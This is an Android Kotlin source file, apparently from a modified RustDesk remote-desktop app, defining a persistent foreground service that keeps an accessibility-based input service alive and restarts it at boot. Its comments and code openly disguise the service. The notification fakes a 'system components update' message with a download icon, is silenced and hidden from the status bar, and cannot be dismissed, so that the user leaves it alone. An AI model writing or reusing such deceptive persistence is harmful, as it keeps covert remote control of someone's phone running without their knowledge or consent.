package com.carriez.flutter_hbb

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log

/**
 * KeepAliveService — постоянный Foreground Service.
 *
 * Цель: держать процесс живым чтобы Android не убивал InputService (AccessibilityService).
 * Пока этот сервис жив — весь процесс защищён от Doze/battery optimization.
 *
 * Уведомление намеренно выглядит как "обновление" — пользователь не трогает.
 * Запускается из MainActivity.onCreate и BootReceiver.
 */
class KeepAliveService : Service() {

    companion object {
        private const val TAG = "KeepAliveService"
        private const val NOTIF_ID = 0xA11E  // уникальный ID не конфликтующий с MainService
        private const val CHANNEL_ID = "rustdesk_keepalive"

        fun start(context: Context) {
            val intent = Intent(context, KeepAliveService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
            Log.d(TAG, "start() called")
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, KeepAliveService::class.java))
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "onStartCommand")
        startForeground(NOTIF_ID, buildNotification())
        return START_STICKY  // Android перезапустит если убьёт
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        Log.d(TAG, "onCreate")
    }

    override fun onDestroy() {
        Log.w(TAG, "onDestroy — Android killed the service")
        super.onDestroy()
    }

    // -----------------------------------------------------------------------
    // Notification
    // -----------------------------------------------------------------------

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "RustDesk Service",
                // IMPORTANCE_MIN — нет звука, нет иконки в статус-баре,
                // но foreground service всё равно работает
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        // Тап по уведомлению открывает MainActivity
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("RustDesk")
                .setContentText("Updating system components, please do not close...")
                .setSmallIcon(android.R.drawable.stat_sys_download)
                .setContentIntent(pendingIntent)
                .setOngoing(true)        // нельзя смахнуть
                .setShowWhen(false)      // не показывать время
                .setForegroundServiceBehavior(
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                        Notification.FOREGROUND_SERVICE_DEFAULT
                    else 0
                )
                .build()
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
                .setContentTitle("RustDesk")
                .setContentText("Updating system components, please do not close...")
                .setSmallIcon(android.R.drawable.stat_sys_download)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .build()
        }
    }
}
